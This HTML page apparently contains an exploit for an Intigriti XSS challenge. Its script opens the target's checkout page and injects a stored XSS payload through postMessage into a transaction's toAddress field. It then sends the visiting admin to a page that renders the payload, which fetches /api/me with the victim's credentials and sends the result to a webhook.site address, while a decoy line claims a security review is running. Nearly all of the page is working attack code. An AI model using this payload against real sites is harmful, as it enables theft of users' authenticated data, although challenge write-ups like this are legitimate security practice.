<!DOCTYPE html>
<html>
<body>
<script>
const TARGET = 'https://challenge-0126.intigriti.io';
const WEBHOOK = 'https://webhook.site/5c699d9b-1a2c-4d4c-a79a-d3f7b3fac905'; // CHANGE THIS

// Open checkout page with valid currency
setTimeout(() => {
    const win = window.open(TARGET + '/checkout.html?currency=BTC&price=1', '_blank');
    
    setTimeout(() => {
        // XSS payload goes in toAddress (breaks out of title attribute)
        const xssPayload = '"><img src=x onerror="fetch(\'/api/me\',{credentials:\'include\'}).then(r=>r.json()).then(d=>fetch(\'' + WEBHOOK + '?flag=\'+btoa(d.flag)))"><span class="';
        
        // Send transaction via postMessage
        win.postMessage({
            type: 'submitTransaction',
            transaction: {
                currency: '1337COIN',  // Must be valid to pass validation
                amount: 0.001,
                toAddress: xssPayload  // XSS payload stored here
            }
        }, '*');
        
        // Redirect admin to trigger XSS rendering
        setTimeout(() => {
            win.close();
            window.location = TARGET + '/marketwatch.html';
        }, 2000);
    }, 2000);
}, 1000);
</script>
<p>Processing security review...</p>
</body>
</html>
